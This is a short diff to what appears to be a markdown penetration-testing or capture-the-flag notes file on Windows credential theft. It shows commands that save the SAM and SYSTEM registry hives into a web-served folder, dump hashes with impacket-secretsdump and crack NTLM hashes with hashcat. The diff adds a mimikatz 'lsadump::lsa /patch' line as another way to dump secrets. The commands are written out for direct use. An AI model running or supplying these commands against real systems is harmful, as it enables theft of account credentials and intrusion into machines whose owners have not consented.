@@ -687,7 +687,15 @@ reg save HKLM\SAM C:\wamp64\attendance\images\test\SAM
 reg save HKLM\SYSTEM C:\wamp64\attendance\images\test\SYSTEM
 
 
-impacket-secretsdump -sam SAM -system SYSTEM LOCAL
+`impacket-secretsdump -sam SAM -system SYSTEM LOCAL`
+
+OR user mimikatz
+
+```cmd
+
+lsadump::lsa /patch
+
+```
 
 
 * crack NTLM if needed `hashcat -m 1000 --force hash /wordlist`
